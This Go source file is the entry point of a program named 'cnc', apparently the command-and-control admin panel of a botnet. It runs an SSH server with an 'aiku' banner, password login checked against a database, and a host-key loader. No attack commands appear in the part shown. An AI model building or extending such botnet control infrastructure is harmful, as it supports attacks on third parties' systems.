package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"

	"github.com/gliderlabs/ssh"
	"github.com/matthewhartstonge/argon2"
	gossh "golang.org/x/crypto/ssh"
)

var database *Database = NewDatabase("", "", "", "")
var argon argon2.Config

var (
	bannerWidth   = 80
	bannerWidthMu sync.RWMutex
)

var bannerLines = []string{
	"",
	"       ▀▀  ▄▄           ",
	"  ▀▀█▄ ██  ██ ▄█▀ ██ ██ ",
	" ▄█▀██ ██  ████   ██ ██ ",
	" ▀█▄██ ██▄ ██ ▀█▄ ▀██▀█ ",
	"        𝓪𝓲𝓴𝓾           ",
	"",
}

func banner() string {
	bannerWidthMu.RLock()
	w := bannerWidth
	bannerWidthMu.RUnlock()
	if w <= 0 {
		w = 80
	}

	var b strings.Builder
	b.WriteString("\033[2J\033[1;1H")
	for _, line := range bannerLines {
		vis := len([]rune(line))
		pad := (w - vis) / 2
		if pad < 0 {
			pad = 0
		}
		b.WriteString("\033[97m")
		b.WriteString(strings.Repeat(" ", pad))
		b.WriteString(line)
		b.WriteString("\033[0m\r\n")
	}
	return b.String()
}

func centerText(text string, width int, color string) string {
	vis := len([]rune(text))
	pad := (width - vis) / 2
	if pad < 0 {
		pad = 0
	}
	return color + strings.Repeat(" ", pad) + text + "\033[0m\r\n"
}

func main() {
	if len(os.Args) != 2 {
		log.Println("./cnc <cnc port>")
		return
	}
	argon = argon2.DefaultConfig()

	sshConfig := &ssh.Server{
		Addr:            ":" + os.Args[1],
		Handler:         sessionHandler,
		PasswordHandler: passwordHandler,
	}
	keyParser("ssh/ssh.cat", sshConfig)

	log.Printf("[*] cnc listening on :%s", os.Args[1])
	err := sshConfig.ListenAndServe()
	if err != nil {
		log.Fatal(err)
	}
}

func sessionHandler(session ssh.Session) {
	NewAdmin(session).Handle()
}

func passwordHandler(ctx ssh.Context, password string) bool {
	login, err := database.TryLogin(ctx.User(), password)
	if err != nil {
		log.Println(err)
		return false
	}
	return login
}

func parseAuthorizationKey(file string) (ssh.PublicKey, error) {
	pubKeyBuffer, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}
	pubKey, _, _, _, err := ssh.ParseAuthorizedKey(pubKeyBuffer)
	if err != nil {
		return nil, err
	}
	return pubKey, nil
}

func keyParser(file string, srv *ssh.Server) {
	pemBytes, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	hostKey, err := gossh.ParsePrivateKey(pemBytes)
	if err != nil {
		fmt.Println(err)
		return
	}
	srv.AddHostKey(hostKey)
}